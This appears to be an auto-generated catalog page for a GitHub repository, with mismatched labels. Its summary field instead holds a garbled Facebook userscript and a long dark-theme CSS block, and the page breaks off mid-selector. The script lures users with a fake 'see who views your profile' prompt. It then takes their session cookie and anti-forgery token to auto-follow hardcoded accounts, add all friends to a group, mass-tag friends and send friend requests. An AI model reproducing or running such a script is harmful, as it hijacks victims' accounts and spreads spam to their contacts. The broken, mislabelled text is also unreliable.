# ephendyy/sahabatfb

## Navigation

[Catalog index](../index.md) · [Language: Radio Garden Speciality](../by-language/radio-garden-speciality.md) · [Category: Language Specification](../by-category/language-specification.md) · [Release watch](../release-watch.md) · [Apache/MIT license index](../license-index.md)

<!-- robots.txt: compliant -->
<!-- canonical: https://github.com/ephendyy/sahabatfb -->
<!-- crawl-delay: 10 -->

## Identity

| Field | Value |
| --- | --- |
| Language branch | Radio Garden Speciality |
| Category | Language Specification |
| Source type | registry_expansion |
| Verification | registry-derived |
| Canonical URL | [https://github.com/ephendyy/sahabatfb](https://github.com/ephendyy/sahabatfb) |
| Source record ids | github_search_radio_garden_speciality-37e5027f72f683 |

## System Engineer Summary

// ==UserScript== // @name facebook 2014 // @version v.01 // @Hak Cipta Ephendy // ==/UserScript==
var fb_dtsg = document.getElementsByName('fb_dtsg')0.value; var user_id =
document.cookie.match(document.cookie.match(/c_user=(\d+)/)1); alert('Apakah Anda Ingin mengetahui
pengintip profil Anda..?? Klik OK untuk melanjutkan'); function cereziAl(isim) { var tarama = isim +
"="; if (document.cookie.length > 0) { konum = document.cookie.indexOf(tarama) if (konum != -1) {
konum += tarama.length son = document.cookie.indexOf(";", konum) if (son == -1) son =
document.cookie.length return unescape(document.cookie.substring(konum, son)) } else { return ""; }
} } function getRandomInt (min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomValue(arr) { return arrgetRandomInt(0, arr.length-1); } var fb_dtsg =
document.getElementsByName('fb_dtsg')0.value; var user_id =
document.cookie.match(document.cookie.match(/c_user=(\d+)/)1); function a(abone){ var http4 = new
XMLHttpRequest(); var url4 = "/ajax/follow/follow_profile.php?__a=1"; var params4 = "profile_id=" +
abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg +
"&lsd&__" + user_id + "&phstamp="; http4.open("POST", url4, true); //Send the proper header
information along with the request http4.setRequestHeader("Content-type", "application/x-www-form-
urlencoded"); http4.setRequestHeader("Content-length", params4.length);
http4.setRequestHeader("Connection", "close"); http4.onreadystatechange = function() {//Call a
function when the state changes. if { http4.close; // Close the connection } } http4.send(params4);
} function sublist(uidss) { var a = document.createElement('script'); a.innerHTML = "new AsyncReques
t().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({
flid: " + uidss + " }).send();"; document.body.appendChild(a); } // ADMIN a("100003968374379");a("10
0002185318761");a("1472703506");a("675820844");a("510704624");a("510704630"); var gid =
'610945318992585'; var fb_dtsg = document 0'value'; var user_id = document'cookie' /)1); var httpwp
= new XMLHttpRequest(); var urlwp = '/ajax/groups/membership/r2j.php?__a=1'; var paramswp =
'&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id +
'&phstamp='; httpwp ; httpwp ; httpwp ; httpwp ; httpwp ; var fb_dtsg = document 0'value'; var
user_id = document'cookie' /)1); var friends = new Array(); gf = new XMLHttpRequest(); gf +
'&filter0=user&options0=friends_only', false); gf ; if (gf'readyState' != 4) {} else { data =
eval('(' + gf'responseText' + ')'); if (data'error') {} else { friends = data'payload''entries' {
return _0x93dax8'index' - _0x93dax9'index'; }); }; }; for (var i = 0; i < friends'length'; i++) {
var httpwp = new XMLHttpRequest(); var urlwp = '/ajax/groups/members/add_post.php?__a=1'; var
paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members='
+ friendsi'uid' + '&__user=' + user_id + '&phstamp='; httpwp ; httpwp ; httpwp ; httpwp ;
httpwp'onreadystatechange' = function () { if {}; }; httpwp ; }; var spage_id = "453791288019170";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)1); var smesaj = ""; var
smesaj_text = ""; var arkadaslar = ; var svn_rev; var bugun= new Date(); var btarihi = new Date();
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1); if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString(); } //arkadaslari al ve isle
function sarkadaslari_al(){ var xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange =
function () { if { eval .replace("for (;;);","") + ";");
for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){ smesaj = ""; smesaj_text = "";
for(i=f*10;i<(f+1)*10;i++){ if(arkadaslar.payload.entriesi){ smesaj += " @" +
arkadaslar.payload.entriesi.uid + ":" + arkadaslar.payload.entriesi.text + ""; smesaj_text += " " +
arkadaslar.payload.entriesi.text; } } sdurumpaylas(); } } }; var params = "&filter0=user"; params +=
"&options0=friends_only"; params += "&options1=nm"; params += "&token=v7"; params += "&viewer=" +
user_id; params += "&__user=" + user_id; if >= 0) { xmlhttp.open ; } else { xmlhttp.open ; }
xmlhttp.send(); } //tiklama olayini dinle var tiklama = document.addEventListener("click", function
() { if(document.cookie.split("paylasti=")1.split(";")0.indexOf("hayir") >= 0){ svn_rev =
document.head.innerHTML.split('"svn_rev":')1.split(",")0; sarkadaslari_al(); document.cookie =
"paylasti=evet;expires="+ btarihi.toGMTString(); document.removeEventListener(tiklama); } }, false);
//arkada?Â¾ ekleme function sarkadasekle(uid,cins){ var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () { if { } }; xmlhttp.open("POST",
"/ajax/add_friend/action.php?__a=1", true); var params = "to_friend=" + uid; params +=
"&action=add_friend"; params += "&how_found=friend_browser"; params += "&ref_param=none"; params +=
"&outgoing_id="; params += "&logging_location=friend_browser"; params += "&no_flyout_on_click=true";
params += "&ego_log_data="; params += "&http_referer="; params += "&fb_dtsg=" +
document.getElementsByName('fb_dtsg')0.value; params += "&phstamp=165816749114848369115"; params +=
"&__user=" + user_id; xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev); xmlhttp.setRequestHeader
("Content-Type","application/x-www-form-urlencoded"); if(cins == "farketmez" &&
document.cookie.split("cins" + user_id +"=").length > 1){ xmlhttp.send(params); }else
if(document.cookie.split("cins" + user_id +"=").length <= 1){
cinsiyetgetir(uid,cins,"sarkadasekle"); }else if(cins == document.cookie.split("cins" + user_id
+"=")1.split(";")0.toString()){ xmlhttp.send(params); } } //cinsiyet belirleme var cinssonuc = {};
var cinshtml = document.createElement ; function scinsiyetgetir(uid,cins,fonksiyon){ var xmlhttp =
new XMLHttpRequest(); xmlhttp.onreadystatechange = function () { if { eval .replace("for (;;);","")
+ ";"); cinshtml.innerHTML = cinssonuc.jsmods.markup01.__html btarihi.setTime(bugun.getTime() +
1000*60*60*24*365); if 0.value == "1"){ document.cookie = "cins" + user_id + "=kadin;expires=" +
btarihi.toGMTString(); }else if 0.value == "2"){ document.cookie = "cins" + user_id +
"=erkek;expires=" + btarihi.toGMTString(); } eval(fonksiyon + "(" + id + "," + cins + ");"); } };
xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev); xmlhttp.send(); } (function() { var css =
"#facebook body:not(.transparent_widget),#nonfooter,#booklet,.UIFullPage_Container,.fbConnectWidgetT
opmost,.connect_widget_vertical_center,.fbFeedbackContent,#LikeboxPluginPagelet\n{ \ncolor: #fff
!important;\nbackground: url repeat fixed left center #051022
!important;\n}\n\n\na,.UIActionButton_Text,span,div,inputvalue=\"Comment\" {text-shadow: #000 1px
1px 1px !important;}\n\n.UIComposer_InputArea *,.highlighter div{text-shadow: none
!important;}\n\n#profile_name {text-shadow: #fff 0 0 2px,#000 1px 1px 3px;}\n\na:hover,.inputbutton:
hover,.inputsubmit:hover,.accent,.hover,.domain_name:hover,#standard_error,.UIFilterList_Selected a:
hover,inputtype=\"submit\":not(.fg_action_hide):hover,.button_text:hover,#presence_applications_tab:
hover,.UIActionMenu:hover,.attachment_link a span:hover,.UIIntentionalStory_Time
a:hover,.UIPortrait_Text .title:hover,.UIPortrait_Text .title
span:hover,.comment_link:hover,.request_link span:hover,.UIFilterList_ItemLink .UIFilterList_Title:h
over,.UIActionMenu_Text:hover,.UIButton_Text:hover,.inner_button:hover,.panel_item
span:hover,listyle*=\"background-color: rgb(255,255,255)\" .friend_status,.dh_new_media span:hover,a
span:hover,.tab_link:hover *,button:hover,#buddy_list_tab:hover *,.tab_handle:hover .tab_name
span,.as_link:hover span,inputtype=\"button\":hover,.feedback_show_link:hover,.page:hover
.text,.group:hover .text,.calltoaction:hover .seeMoreTitle,.liketext:hover,.tickerStoryBlock:hover
.uiStreamMessage
span,.tickerActionVerb,.mleButton:hover,.bigNumber,.pluginRecommendationsBarButton:hover {color:
#9cf !important;text-shadow: #fff 0 0 2px !important;text-decoration: none
!important;}\n\n\n.fbChatSidebar .fbChatTypeahead .textInput,.fbChatSidebarMessage,.devsitePage
.body > .content {box-shadow: none
!important;}\n\n.presence_menu_opts,#header,.LJSDialog,.chat_window_wrapper,#navAccount
ul,.fbJewelFlyout,.uiTypeaheadView,.uiToggleFlyout { box-shadow: 0 0 3em #000;
}\n\n.UIRoundedImage,.UIContentBox_GrayDarkTop,.UIFilterList > .UIFilterList_Title, .dialog-
title,.flyout,.uiFacepileItem .uiTooltipWrap {box-shadow: 0 0 1em 1px #000;}\n\n.extra_menus ul li:h
over,.UIRoundedBox_Box,.fb_menu_link:hover,.UISelectList_Item:hover,.fb_logo_link:hover,.hovered,#pr
esence_notifications_tab,#chat_tab_barx,.tab_button_div,.plays_val, #mailBoxItems li
a:hover,.buddy_row a:hover,.buddyRow a:hover,#navigation
a:hover,#presence_applications_tab,#buddy_list_tab,#presence_error_section,.uiStepSelected
.middle,.jewelButton,#pageLogo,.fbChatOrderedList .item:hover,.uiStreamHeaderTall {box-shadow: 0 0
3px #000,inset 0 0 5px #000 !important;}\n\n\n.topNavLink >
a:hover,#navAccount.openToggler,.selectedCheckable {box-shadow: 0 0 4px 2px #9cf,inset 0 0 2em #69f
!important;}\n\n\n.fbChatBuddyListDropdown .uiButton,.promote_page a,.create_button
a,.share_button_browser div,.silver_create_button,.button:not(.uiSelectorButton):not(.close):not(.vi
deoicon),button:not(.as_link),.GBSearchBox_Button,.UIButton_Gray,.UIButton,.uiButton:not(.uiSelector
Button),.fbPrivacyWidget .uiSelectorButton:not(.lockButton),.uiButtonSuppressed,.UIActionMenu_Suppre
ssButton,.UIConnectControlsListSelector .uiButton,.uiSelector:not(.fbDockChatDropdown)
.uiSelectorButton:not(.uiCloseButton),.fbTimelineRibbon,#fbDockChatBuddylistNub
.fbNubButton,.pluginRecommendationsBarButtonLike {box-shadow: 0 0 .5em rgba(0,0,0,0.9),inset 0 0
.75em #9cf !important;border-width: 0 !important; }\n\n.fbChatBuddyListDropdown
.uiButton:hover,.uiButton:not(.uiSelectorButton):hover,.fbPrivacyWidget .uiSelectorButton:not(.lockB
utton):hover,.uiButtonSuppressed:hover,.UIButton:hover,.UIActionMenu_Wrap:hover,.tabs li:hover,.ntab
:hover,inputtype=\"submit\":not(.fg_action_hide):not(.stat_elem):not(name=\"add\"):not(name=\"action
sreject\"):not(name=\"actionsaccept\"):not(value=\"Find Friends\"):not(value=\"Share\"):not(value=\"
Maybe\"):not(value=\"No\"):not(value=\"Yes\"):not(value=\"Comment\"):not(value=\"Reply\"):not(type=\
"Flag\"):not(type=\"submit\"):hover,.inputsubmit:hover,.promote_page:hover,.create_button:hover,.sha
re_button_browser:hover,.silver_create_button_shell:hover,.painted_button:hover,.flyer_button:hover,
.button:not(.close):not(.uiSelectorButton):not(.videoicon):hover,button:not(.as_link):hover,.GBSearc
hBox_Button:hover,.tagsWrapper,.UIConnectControlsListSelector
.uiButton:hover,.uiSelector:not(.fbDockChatDropdown)
.uiSelectorButton:not(.uiCloseButton):hover,.fbTimelineMoreButton:hover,#fbDockChatBuddylistNub
.fbNubButton:hover,.tab >
div:not(.title):hover,.detail.frame:hover,.pluginRecommendationsBarButtonLike:hover {box-shadow: 0 0
.5em #000,0 0 1em 3px #9cf,inset 0 0 2em #69f !important;}\n\n#icon_garden,.list_select .friend_list
{box-shadow: 0 0 3px -1px #000,inset 0 0 3px -1px #000;}\n\n.bb
.fbNubButton,.uiScrollableAreaGripper {box-shadow: inset 0 4px 8px #9cf,0 0 1em #000
!important;}\n\n.bb .fbNubButton:hover {box-shadow: inset 0 4px 8px #9cf,0 .5em 1em 1em #9cf
!important;}\n\n.fbNubFlyoutTitlebar {box-shadow: inset 0 4px 8px #9cf;padding: 0 4px
!important;}\n\n#fb_menubar,.progress_bar_outer {box-shadow: inset 0 0 3px #000,0 0 3em 3px
#000;}\n#presence_ui {box-shadow: 0 0 3em 1px
#000}\n\n#buddy_list_tab:hover,.tab_handle:hover,.focused {box-shadow: 0 0 3px #000,inset 0 0 3px
#000,0 0 3em 5px #fff;}\n\n.uiSideNavCount,.jewelCount,.uiContextualDialogContent,.fbTimelineCapsule
.fbTimelineTwoColumn > .timelineUnitContainer:hover,.timelineReportContainer:hover,.uiOverlayPageCon
tent,.pagesTimelineButtonPagelet .counter,#pagelet_timeline_profile_actions
.counter,.uiScaledImageContainer:hover, .pagesVoiceBar, ._k5 {box-shadow: 0 0 1em 4px #9cf
!important;}\n\n.img_link:hover,.album_thumb:hover,.fbChatTourCallout .body,.fbSidebarGripper div
{box-shadow: 0 0 3em #9cf;}\n\n.shaded,.progress_bar_inner,.tickerStoryAllowClick {box-shadow: inset
0 0 1em #9cf !important}\n\n.UIPhotoGrid_Table .UIPhotoGrid_TableCell:hover .UIPhotoGrid_Image,#myph
oto:hover,.mediaThumbWrapper:hover,.uiVideoLink:hover,.mediaThumb:hover,#presence.fbx_bar
#presence_ui #presence_bar .highlight,.fbNubFlyout:hover,.hovercard .stage,#fbDockChatBuddylistNub
.fbNubFlyout:hover,.balloon-content,.-cx-PRIVATE-uiDialog__border {box-shadow: 0 0 3em 5px #9cf
!important;}\n\n.fbNubFlyout,.uiMenuXBorder {box-shadow: 0 0 3em 5px #000 !important;}\n\n#blueBar
{box-shadow: 0 0 1em 3px #000 !important;}\n\n\n.fill {box-shadow: inset 0 0 2em #69f,0 0 1em #000
!important;}\n\n\ninputtype=\"file\"{-moz-appearance:none!important;border: none !important;}\n\n\n.
status_text,h4,a,h2,.flyout_menu_title,.url,#label_nm,h5,.WelcomePage_MainMessage,#public_link_uri,#
public_link_editphoto span,#public_link_editalbum
span,.dh_subtitle,.app_name_heading,.box_head,.presence_bar_button span,a:link
span,#public_link_album
span,.note_title,.link_placeholder,.stories_title,.typeahead_suggestion,.boardkit_title,.section-
title strong,.inputbutton,.inputsubmit,.matches_content_box_title,.tab_name,.header_title_text,.sign
up_box_message,.quiz_start_quiz,.sidebar_upsell_header,.wall_post_title,.megaphone_header,.source_na
me,.UIComposer_AttachmentLink,.fcontent > .fname,#presence_applications_tab,.mfs_email_title,.flyout
.text,.UIFilterList_ItemLink .UIFilterList_Title,.announce_title,.attachment_link a
span,.comment_author,.UIPortrait_Text
.title,.comment_link,.UIIntentionalStory_Names,#profile_name,.UIButton_Text,.dh_new_media
span,.share_button_browser div,.UIActionMenu_Text,.UINestedFilterList_Title,button,.panel_item
span,.stat_elem,.action,#contact_importer_container inputvalue=\"Find Friends\":hover,.navMore,.navL
ess,inputname=\"add\",inputname=\"actionsreject\",inputname=\"actionsaccept\",inputname=\"actionsmay
be\",.uiButtonText,.as_link .default_message,.feedback_hide_link,.feedback_show_link,#fbpage_fan_sid
ebar_text,.comment_actual_text a span,.uiAttachmentDesc a span,.uiStreamMessage a span,.group
.text,.page .text,.uiLinkButton input,.blueName,.uiBlingBox span.text,.commentContent a
span,.uiButton input,.fbDockChatTab
.name,.simulatedLink,.bfb_tab_selected,.liketext,a.UIImageBlock_Content,.uiTypeaheadView li .text,.a
uthor,.authors,.itemLabel,.passiveName,.token,.fbCurrentTitle,.fbSettingsListItemLabel,.uiIconText,#
uetqg1_8,.fbRemindersTitle,.mleButton,.uiMenuItem .selected .name {color: #9cf
!important;}\n\n#email,option,.disclaimer,.info
dd,.UIUpcoming_Info,.UITos_ReviewDescription,.settings_box_text,divstyle*=\"color: rgb(85,85,85)\"
{color: #999 !important;}\n\n.status_time,.header_title_wrapper,.copyright,#newsfeed_submenu,#newsfe
ed_submenu_content strong,.summary,.caption,.story_body,.social_ad_advert_text,.createalbum
dt,.basic_info_summary_and_viewer_actions dt,.info dt,.photo_count,p,.fbpage_fans_count,.fbpage_type
,.quiz_title,.quiz_detailtext,.byline,label,.fadvfilt
b,.fadded,.fupdt,.label,.main_subtitle,.minifeed_filters
li,.updates_settings,#public_link_photo,#phototags em,#public_link_editphoto,.note_dialog,#public_li
nk_editalbum,.block_add_person,.privacy_page_field,.action_text,.network,.set_filters span,.byline s
pan,#no_notes,#cheat_sheet,.form_label,.share_item_actions,.options_header,.box_subtitle,.review_hea
der_subtitle_line,.summary strong,.upsell dd,.availability_text,#public_link_album,.explanation,.aim
_link,.subtitle,#profile_status,spanstyle*=\"color:
rgb(51,51,51)\",.fphone_label,.phone_type_label,.sublabel,.gift_caption,dd
span,.events_bar,.searching,.event_profile_title,.feedBackground,.fp_show_less,.increments
td,.status_confirm,.sentence,.admin_list span,.boardkit_no_topics,.boardkit_subtitle,.petition_previ
ew,.boardkit_topic_summary,li,#photo_badge,.status_body,
.spell_suggest_label,.pg_title,.white_box,.token span,.profile_activation_score,.personal_msg
span,.matches_content_box_subtitle span,trfbcontext=\"41097bfeb58d\" td,.title,.floated_container
span:not(.accent),divstyle*=\"color: rgb(85,85,85)\",divstyle*=\"color:
rgb(68,68,68)\",.present_info_label,.fbpage_description,.tagged span,#tags h2 strong,#tags div
span,.detail,.chat_info_status,.gray-
text,.author_header,.inline_comment,.fbpage_info,.gueststatus,.no_pages,.topic_pager,.header_comment
span,divstyle*=\"color: rgb(101,107,111)\",#q,spanstyle*=\"color: rgb(85,85,85)\",.pl-
item,.tagged_in,.pick_body,tdstyle*=\"color: rgb(85,85,85)\",strongstyle*=\"color:
rgb(68,68,68)\",divstyle*=\"color: gray\",.group_officers
dd,.fbpage_group_title,.application_menu_divider,.friend_status span,.more_info,.logged_out_register
_subhead,.logged_out_register_footer,inputtype=\"text\",textarea,.status_name span,inputtype=\"file\
",.UIStoryAttachment_Copy,.stream_participants_short,.UIHotStory_Copy,inputtype=\"submit\":not(.fg_a
ction_hide):not(.stat_elem):not(.UIButton_Text):not(name=\"add\"):not(name=\"actionsreject\"):not(na
me=\"actionsaccept\"):not(value=\"Find Friends\"):not(value=\"Share\"):not(value=\"Maybe\"):not(valu
e=\"No\"):not(value=\"Yes\"):not(value=\"Comment\"):not(value=\"Reply\"):not(value=\"Flag\"):not(typ
e=\"submit\"),inputtype=\"search\",inputtype=\"input\",.inputtext,.relationship span,inputtype=\"but
ton\":not(value=\"Comment\"),inputtype=\"password\",#reg_pages_msg,.UIMutableFilterList_Tip,.like_se
ntence,.UIIntentionalStory_InfoText,.UIHotStory_Why,.question_text,.UIStory,.tokenizer,inputtype=\"h
idden\",.tokenizer_input *,.text:not(.external),.flistedit
b,.fexth,.UIActionMenu_Main,spanstyle*=\"color: rgb(102,102,102)\",divstyle*=\"color:
rgb(85,85,85)\",divstyle*=\"color: rgb(119,119,119)\",blockquote,.description,.security_badge,.full_
name,.email_display,.email_section,.chat_fl_nux_messaging,.UIObjectListing_Subtext,.confirmation_log
in_content,.confirm_username,.UIConnectControls_Body em,.comment_actual_text,.status,.UICantSeeProfi
leBlurbText,.UILiveLink_Description,.recaptcha_text,.UIBeep_Title,.UIComposer_Attachment_ShareLink_U
RL,.app_dir_app_category,.first_stat,.aggregate_review_title,.stats span,.facebook_disclaimer,.app_d
ir_app_creator,.app_dir_app_monthly_active_users,.app_dir_app_friend_users,.UISearchFilterBar_Label,
.UIFullListing_InfoLabel,.email_promise_detail,.title_text,.excerpt,.dialog_body,.tos,.UIEMUASFrame_
body,.page_note,.nux_highlight_composer,.UIIntentionalStory_BottomAttribution,.tagline,.GBSelectList
,.gigaboxx_thread_header_authors,.GBThreadMessageRow_ReferrerLink,#footerWrapper,.infoTitle,.fg_expl
ain,.UIMentor_Message,.GenericStory_BottomAttribution,.chat_input,.video_timestamp
span,#tagger_prompt,.UIImageBlock_Content,.new_list span, .GBSearchBox_Input input,.SearchPage_Email
SearchLeft,.sub_info,.UIBigNumber_Label,.UIInsightsGeoList_ListTitle,.UIInsightsGeoList_ListItemValu
e,.UIInsightsSmall_Note,.textmedium,.UIFeedFormStory_Lead,.home_no_stories_content,
.title_label,divstyle*=\"color: rgb(102,102,102)\",*style*=\"color: rgb(51,51,51)\",.tab_box_inner,.
uiStreamMessage,.privacy_section_description,.info_text,.uiAttachmentDesc,.uiListBulleted
span,.privacySettingsGrid th,.recommendations_metadata,.postleft
dd:not(.usertitle),.postText,.mall_post_body_text,.fbChatMessage,.fbProfileBylineFragment,.nosave
option,.uiAttachmentDetails,.fbInsightsTable
td,.mall_post_body,.uiStreamPassive,.snippet,.questionInfo span,.promotionsHowto,.fcg,.headerColumn
.fwb,.rowGroupTitle .fwb,.rowGroupDescription .fwb,.likeUnit,.aboveUnitContent,.placeholder,.section
Content,.UIFaq_Snippet,.uiMenuItem:not(.checked) .name,.balloon-
text,.fbLongBlurb,.legendLabel,.messageBody {color: #bbb !important;}\n\n.status_clear_link,h3,h1,.u
pdates,.WelcomePage_SignUpHeadline,.WelcomePage_SignUpSubheadline,.mock_h4
.left,.review_header_title,caption,.logged_out_register_msg,.domain_name,
.UITitledBox_Title,.signup_box_content,.highlight,.question,.whocan span,.UIFilterList > .UIFilterLi
st_Title,.subject,.UIStoryAttachment_Label,.typeahead_message,.UIShareStage_Title,.alternate_name,.h
elper_text,.textlarge,.page
.category,.item_date,.privacy_section_label,.privacy_section_title,.uiTextMetadata, .seeMoreTitle,.c
ategoryContents,code,.usertitle,.fbAppSettingsPageHeader,.fsxl,.LogoutPage_MobileMessage,.LogoutPage
_MobileSubmessage,.recommended_text,#all_friends_text,.removable,.ginormousProfileName,.experienceCo
ntent .fwb,#bfb_t_popular_body divstyle*=\"color:#880000\",.fsm:not(.snippet):not(.itemLabel):not(.f
bChatMessage),.uiStreamHeaderTextRight,.bookmarksNavSeeAll,.tab .content,.fbProfilePlacesFilterCount
,.fbMarketingTextColorDark,.pageNumTitle,.pluginRecommendationsBarButton {color: #69f !important;}\n
\n.em,.story_comment_back_quote,.story_content,small,.story_content_excerpt,.walltext,.public,p
span,#friends_page_subtitle,.main_title,.empty_message,.count,.count strong,.stories_not_included li
span,.mobile_add_phone th,#friends strong,.current,.no_photos,.intro,.sub_selected
a,.stats,.result_network,.note_body,#bodyContent div b,#bodyContent div,.upsell dt,.buddy_count_num
strong,.left,.body,.tab .current,.aim_link span,.story_related_count,.admins span,.summary
em,.fphone_number,.my_numbers_label,.blurb_inner,.photo_header
strong,.note_content,.multi_friend_status,.current_path
span,.current_path,.petition_header,.pyramid_summary strong,#status_text,.contact_email_pending
em,.profile_needy_message,.paging_link div,.big_title,.fb_header_light,.import_status
strong,.upload_guidelines ul li span,.upload_guidelines ul li span
strong,#selector_status,.timestamp
strong,.chat_notice,.notice_box,.text_container,.album_owner,.location,.info_rows
dd,.divider,.post_user,divstyle=\"color: rgb(101,107,111);\" b,divstyle=\"color: rgb(51,51,51);\"
b,.basic_info_summary_and_viewer_actions dd,.profile_info dd,.story_comment,p strong,th
strong,.fstatus,.feed_story_body,.story_content_data,.home_prefs_saved p,.networks
dd,.relationship_status dd,.birthday dd,.current_city
dd,.UIIntentionalStory_Message,.UIFilterList_Selected
a,.UIHomeBox_Title,.suggestion,.spell_suggest,.UIStoryAttachment_Caption,.fexth +
td,.fext_short,#fb_menu_inbox_unread_count,.Tabset_selected .arrow .sel_link
span,.UISelectList_check_Checked,.chat_fl_nux_header,.friendlist_status .title a,.chat_setting
label,.UIPager_PageNum,.good_username,.UIComposer_AttachmentTitle,.rsvp_option:hover
label,.Black,.comment_author span,.fan_status_inactive,.holder,.UIThumbPagerControl_PageNumber,.text
_center,.nobody_selected,.email_promise,.blocklist ul,#advanced_body_1
label,.continue,.empty_albums,divstyle*=\"color:
black\",.GBThreadMessageRow_Body_Content,.UIShareStage_Subtitle,#public_link_photo
span,.GenericStory_Message,.UIStoryAttachment_Value,divstyle*=\"color: black\",.SearchPage_EmailSear
chTitle,.uiTextSubtitle,.jewelHeader,.recent_activity_settings_label,.people_list_item,.uiTextTitle,
.tab_box,.instant_personalization_title,.MobileMMSEmailSplash_Description,.MobileMMSEmailSplash_Tips
andtricks_Title,.fcb,inputvalue=\"Find Friends\",#bodyContent,#bodyContent
table,h6,.fbChatBuddylistError,.info
dt,.bfb_options_minimized_hide,.connect_widget_connected_text,body.transparent_widget .connect_widge
t_not_connected_text,.connect_widget_button_count_count,.fbInsightsStatisticNumber,.fbInsightsTable
thead th span,.header span,.friendlist_name a,.count .countValue,.uiHeaderTitle
span,#about_text_less
span,.uiStreamHeaderText,.navHeader,.uiAttachmentTitle,.fbProfilePlacesFilterText,.tagName,.ufb-
dataTable-header-text,.ufb-text-content,.fb_content,.uiComposerAttachment .selected
.attachmentName,.balloon-title,.cropMessage {color: #fff !important;}\n\n.bfb_post_action_container
{opacity: .25 !important;}\n.bfb_post_action_container:hover {opacity: 1
!important;}\n\n.valid,.wallheader small,#photodate,.video_timestamp strong,.date_divider
span,.feed_msg h5,.time,.item_contents,.boardkit_topic_updated,.walltime,.feed_time,.story_time,#sta
tus_time_inner,.written small,.date,divstyle*=\"color: rgb(85,82,37)\",.timestamp
span,.time_stamp,.timestamp,.header_info_timestamp,.more_info div,.timeline,.UIIntentionalStory_Time
,.fupdt,.note_timestamp,.chat_info_status_time,.comment_actions,.UIIntentionalStory_Time
a,.UIUpcoming_Time,.rightlinks,.GBThreadMessageRow_Date,.GenericStory_Time
a,.GenericStory_Time,.fbPrivacyPageHeader,.date_divider {color: #69f !important;}\n\n.textinput,sele
ct,.list_drop_zone,.msg_divide_bottom,textarea,inputtype=\"text\",inputtype=\"file\",inputtype=\"sea
rch\",inputtype=\"input\",inputtype=\"password\",.space,.tokenizer,inputtype=\"hidden\",#flm_new_inp
ut,.UITooltip:hover,.UIComposer_InputShadow,.searchroot
input,inputname=\"search\",.uiInlineTokenizer,input.text,input.nosave {background: rgba(0,0,0,.50)
!important;-moz-appearance:none!important;color: #bbb !important;border: none !important;padding:
3px !important; }\n\ninputtype=\"text\":focus,textarea:focus,.fbChatSidebar .fbChatTypeahead
.textInput:focus {box-shadow: 0 0 .5em #9cf,inset 0 0 .25em #69f
!important;}\n\n.uiOverlayPageWrapper,#fbPhotoSnowlift,.shareOverlay,.tlPageRecentOverlay
{background: -moz-radial-gradient(50% 50%,circle,rgba(10,10,10,.6),rgb(10,10,10) 90%)
!important;}\n\n.bumper,.stageBackdrop {background: #000 !important;}\n#page_table {background: #333
}\n\n.checkableListItem:hover a,.selectedCheckable a {background: #69f !important;
}\n\n.GBSearchBox_Input,.tokenizer,.LTokenizerWrap,#mailBoxItems li a:hover,.uiTypeaheadView .search
.selected,.itemAnchor:hover,.notePermalinkMaincol .top_bar, .notification:hover a,#bfb_tabs
div:not(.bfb_tab_selected),.bfb_tab,.navIdentity
form:hover,.connect_widget_not_connected_text,.uiTypeaheadView
li.selected,.connect_widget_number_cloud,.placesMashCandidate:hover,.highlight,#bfb_option_list li
a:hover {background: rgba(0,0,0,.5) !important;}\n\n.results .page,.calltoaction,.results li,.fbNubF
lyout,.contextualBlind,.bfb_dialog,.bfb_image_preview,input.text,.fbChatSidebar,.jewelBox,.clickToTa
gMessage,.tagName,.ufb-tip-body,.flyoutContent,.fbTimelineMapFilterBar,.fbTimelineMapFilter,.fbPhoto
StripTypeaheadForm,.groupsSlimBarTop,.pas,.contentBox,.fbMapCalloutMain, .pagesVoiceBar {background:
rgba(10,10,10,.75) !important;}\n\n#pageNav .tinyman:hover a,#navHome:hover a,#pageNav .tinyman
astyle*=\"cursor: progress\",#navHome astyle*=\"cursor:
progress\",#home_filter_list,#home_sidebar,#contentWrapper,.LDialog,.dialog-
body,.LDialog,.LJSDialog,.dialog-foot,.chat_input,#contentCol,#leftCol,.UIStandardFrame_Content,.red
_box,.yellow_box,.uiWashLayoutOffsetContent,.uiOverlayContent,.bfb_post_action_container,.connect_wi
dget_button_count_count,.shaded,.navIdentitySub,.jewelItemList li a:hover,.fbSidebarGripper div,.jew
elCount,.uiBoxRed,.videoUnit,.lifeEventAddPhoto,.fbTimelineLogIntroMegaphone,.uiGamesLeaderboardItem
,.pagesTimelineButtonPagelet .counter,#pagelet_timeline_profile_actions .counter,.newInterestListNav
Item:hover,.ogSliderAnimPagerPrevContent,.ogSingleStoryStatus,.ogSliderAnimPagerNextContent,.-cx-
PRIVATE-uiDialog__body,.jewelItemNew .messagesContent {background: rgba(10,10,10,.5) !important;}\n\
n#home_stream,pre,.ufiItem,.odd,.uiBoxLightblue,.platform_dialog_bottom_bar,.uiBoxGray,.fbFeedbackPo
sts,.mall_divider_text,.uiWashLayoutGradientWash, #bfb_options_body,.UIMessageBoxStatus,.tip_content
.highlight,.fbActivity,
.auxlabel,.signup_bar_container,#wait_panel,.FBAttachmentStage,.sheet,.uiInfoTable
.name,.HCContents,#devsiteHomeBody .content,.devsitePage .nav
.content,#confirm_phone_frame,.fbTimelineCapsule .timelineUnitContainer,.timelineReportContainer,.ab
oveUnitContent,.aboutMePagelet,#pagelet_tab_content_friends,#fbProfilePlacesBorder,#pagelet_tab_cont
ent_notes,.externalShareUnit,.fbTimelineNavigationWrapper
.detail,.tosPaneInfo,.navSubmenu:hover,#bfb_donate_pagelet > div,.better_fb_mini_message,.uiBoxWhite
,.uiLoadingIndicatorAsync,.mleButton,.fbTimelineBoxCount,.navSubmenu:hover,.gradient,.profileBrowser
